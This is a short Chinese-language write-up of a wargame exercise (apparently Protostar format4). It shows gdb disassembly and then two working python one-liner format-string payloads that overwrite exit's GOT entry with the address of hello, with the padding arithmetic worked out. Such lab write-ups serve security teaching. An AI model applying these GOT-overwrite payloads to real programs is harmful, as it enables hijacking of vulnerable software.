```
gef➤  disas vuln
Dump of assembler code for function vuln:
   0x080484d2 <+0>:	push   ebp
   0x080484d3 <+1>:	mov    ebp,esp
   0x080484d5 <+3>:	sub    esp,0x218
   0x080484db <+9>:	mov    eax,ds:0x8049730
   0x080484e0 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484e4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484ec <+26>:	lea    eax,[ebp-0x208]
   0x080484f2 <+32>:	mov    DWORD PTR [esp],eax
   0x080484f5 <+35>:	call   0x804839c <fgets@plt>
   0x080484fa <+40>:	lea    eax,[ebp-0x208]
   0x08048500 <+46>:	mov    DWORD PTR [esp],eax
   0x08048503 <+49>:	call   0x80483cc <printf@plt>
   0x08048508 <+54>:	mov    DWORD PTR [esp],0x1
   0x0804850f <+61>:	call   0x80483ec <exit@plt>
End of assembler dump.
```

![](http://imcczy.b0.upaiyun.com/2016-09-07-11%3A11%3A31.jpg)

```
gef➤  disas hello
Dump of assembler code for function hello:
   0x080484b4 <+0>:	push   ebp
```
把exit的got覆盖成hello的地址即可。
h表示short，32位系统是2字节，hh表示char，1字节。

```
➜  format4 python -c "print '\x26\x97\x04\x08\x24\x97\x04\x08%2044x%4\$hn%31920x%5\$hn'" |  ./format4
或者
0x00b4  => 0x08049724 => 0xb4-0xc = 168d
0x0484  => 0x08049725 => 0x484-0xb4 = 976d
0x0008  => 0x08049727 => 0x484+?=*08 => 0x508-0x484 = 132d
➜  format4 python -c 'print "\x24\x97\x04\x08\x25\x97\x04\x08\x27\x97\x04\x08%168x%4$n%976x%5$n%132x%6$n"' | ./format4
```